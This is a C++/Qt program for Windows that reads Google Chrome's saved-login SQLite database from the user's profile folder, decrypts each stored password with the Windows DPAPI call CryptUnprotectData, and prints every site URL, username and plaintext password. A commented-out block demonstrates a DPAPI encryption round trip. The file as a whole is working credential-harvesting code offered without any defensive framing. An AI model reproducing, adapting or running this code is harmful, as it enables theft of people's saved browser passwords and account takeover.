#include <iostream>
#include <QCoreApplication>
#include <QtSql/QSqlDatabase>
#include <QSqlQuery>
#include <QString>
#include <QDebug>
#include <QSqlError>

#include <windows.h>
//#include "dpapi.h"
//#include <wincrypt.h>

using namespace std;

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    setlocale(LC_CTYPE, "rus");

    //Connect to DB
    QSqlDatabase db;
    db = QSqlDatabase::addDatabase("QSQLITE");
    //Get %appdata% folder
    QString appdata = getenv("APPDATA");
    appdata.replace("\\", "/");
    //Destination folder
    db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
    db.open();


    if ( !db.isOpen() )
    {
        qDebug() << "Error\n";
    }
    else
    {
        //Create SQL Query; select url+login+pass
        QSqlQuery query;
        query.exec("SELECT origin_url, username_value, password_value FROM logins");

        while (query.next())
        {

            QString url = query.value(0).toString();
            QString user = query.value(1).toString();
            QByteArray pass = query.value(2).toByteArray();

            //Decrypt
            DATA_BLOB DataIn;
            DATA_BLOB DataOut;
            DATA_BLOB * pDataIn = &DataIn;
            DATA_BLOB * pDataOut = &DataOut;

            DataIn.pbData =  reinterpret_cast<byte *>( pass.data() );  //Pointer to data_input  BYTE*
            DataIn.cbData = pass.size();                               //Size of input string   DWORD

            if (CryptUnprotectData(     //Decryption function
                    pDataIn,
                    NULL,
                    NULL,               // Entropy
                    NULL,
                    NULL,
                    0,
                    pDataOut))
            {
                QString pass_decr;
                unsigned long pass_size  = static_cast<unsigned long>(DataOut.cbData);

                //Get pass string and cut it (pbData doesn't have '\0')
                pass_decr.append(reinterpret_cast<char *>(DataOut.pbData));
                pass_decr.resize(pass_size);

                qDebug().noquote() << endl << url << endl << "user = " << user << "\npass =  " << pass_decr;
            }
            else
            {
                qDebug() << "\nDecryption error!";
            }
        }
    }




/*  DEBUG

    //All tables in file
    qDebug() << db.tables() << " ";

    //Simple example of encryption/decryption
    DATA_BLOB DataIn;
    DATA_BLOB DataOut;
    BYTE *pbDataInput =(BYTE *)"Hello world of data protection.";
    DWORD cbDataInput = strlen((char *)pbDataInput)+17;

    DataIn.pbData = pbDataInput;
    DataIn.cbData = cbDataInput;
    QByteArray qba;
    char * ch = reinterpret_cast<char *> (pbDataInput);
    qba = ch;

    qDebug() << DataIn.pbData << endl<< reinterpret_cast<char *>(DataIn.pbData) << endl << qba.data();

    if(CryptProtectData(
         &DataIn,
         NULL, // A description string
                                             // to be included with the
                                             // encrypted data.
         NULL,                               // Optional entropy not used.
         NULL,                               // Reserved.
         NULL,                               // Pass NULL for the
                                             // prompt structure.
         0,
         &DataOut))
    {
         qDebug() << "The encryption phase worked.\n";
    }

    DATA_BLOB DataVerify;

    if ( CryptUnprotectData(
            &DataOut,
            NULL,
            NULL,                 // Optional entropy
            NULL,                 // Reserved
            NULL,                 // Here, the optional
                                  // prompt structure is not
                                  // used.
            0,
            &DataVerify) )
    {
       qDebug() << "The decrypted data is: " << reinterpret_cast<char *>(DataVerify.pbData) << endl;
       //printf("The decrypted data is: %s\n", DataVerify.pbData);
    }
    else qDebug() << "Decryption error!";


*/

    return a.exec();
}
